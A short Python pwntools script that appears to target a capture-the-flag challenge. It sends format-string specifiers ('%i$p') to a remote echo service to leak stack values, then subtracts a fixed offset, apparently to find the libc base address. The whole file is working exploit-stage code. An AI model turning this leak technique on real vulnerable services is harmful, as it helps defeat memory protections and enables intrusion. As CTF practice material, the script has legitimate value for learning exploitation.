from pwn import *
libc = ELF("./libc.so.6")

for i in range(500):
    p = remote("ctf-chall.stembascc.com", 5213)
    p.sendline(f"%{i}$p")
    p.recvuntil(b"Welcome to echo service!\n")
    hasil = p.recvline().strip().decode()
    
    print(f"{i}: " + hasil)
    
    try:
        # Check if the leaked value is a valid hexadecimal address
        if hasil.startswith('0x'):
            leaked_value = int(hasil, 16)
            result = leaked_value - 0x2045c0
            print(f"Leaked value - 0x2045c0 = {hex(result)}")
        else:
            raise ValueError("Not a valid address")
    except (ValueError, TypeError):
        print(f"{i}: Skipping invalid value")

    p.close()
